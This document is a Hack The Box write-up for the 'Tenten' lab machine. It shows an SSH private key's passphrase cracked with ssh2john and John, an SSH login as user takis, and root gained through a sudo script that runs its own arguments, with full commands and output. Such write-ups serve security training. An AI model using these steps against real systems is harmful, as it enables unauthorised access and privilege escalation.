# Foothold

## User Takis
- We can use ssh2john and then use john on the hash.
```bash
./ssh2john.py id_rsa > id_rsa.hash
╭─norman@kali ~/Hack-The-Box/machines/tenten ‹main*› 
╰─$ cat id_rsa.hash 
id_rsa:$sshng$1$16$7265FC656C429769E4C1EEFC618E660C$1200$fc75dc501393dc98736e51fbb85f5587b7da6bb
e971c876bfc2874a439c9ba78dd98b4bf95aab592e950dff445fd56b1b634f38ff57984111c2f919c1efddeb2b383952
d2384c2f9de5029ae4a5ac1f6efc1b47e5f114826ecfbccb7ddfef0e8d4ab86ac2ad146c8a993269ee4a8aa942d77edb
9962bd684ff87395f6c9f55338478e0dd5b4ac0a13cc6b9f5ad4e165f2b69f2d224c63e7743ecb31d9bfa393b902cf82
843605369855d570e07c3cc78289ca302e22112ec993c1b3db43c9b2649d5826b317aa4812a848e0d42b9e477c9262aa
ce4a5f5aa643cf7fa0e9fe3d1987fdeda3394d081375acb6a05aa85c758f84adc29b4b4c1aa2d9034d7ea0dbb05d2d07
e77b7d146ec6a94df5c23ee7006581a5f1a8746c1e75875ee3394e04f55b36e95130a3a412bbff34288655170aea4e50
b5d6f07e8ae1fba6cc8e6284e90bcc5db7ac66d434802f52259de5313274218f37f0741980eb12c358c3af1b8f5760d
...[snip]...
```
- The run john against it
```bash
john --wordlist=$ROCK id_rsa.hash                                                     130 ↵
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa)
Warning: Only 1 candidate left, minimum 4 needed for performance.
1g 0:00:00:06 DONE (2021-04-15 09:11) 0.1494g/s 2143Kp/s 2143Kc/s 2143KC/s *7¡Vamos!
Session completed
```
- So superpassword is the password for the private key.
- `chmod 600 id_rsa` and then try to ssh as `takis`, which was one of the users from the wordpress blog, and use the password superpassword.
```bash
ssh takis@10.10.10.10 -i id_rsa 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
39 updates are security updates.


Last login: Thu Apr 15 15:57:44 2021 from 10.10.14.5
takis@tenten:~$ 

```
- We can cat out the user.txt

# Privilege Escalation

## User root
- Upon running `sudo -l` we see we can run `/bin/fuckin` as sudo
```bash
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin

```
- Upon reading the file, we can see it is a bash script (from the shebang line), which we can executes the arguments (1-4)
```bash
takis@tenten:~$ cat /bin/fuckin
#!/bin/bash
$1 $2 $3 $4

```
- We can run `sudo /bin/fuckin bash` to get a root shell and then cat out the root.txt
```bash
takis@tenten:~$ sudo /bin/fuckin bash
root@tenten:~# 
```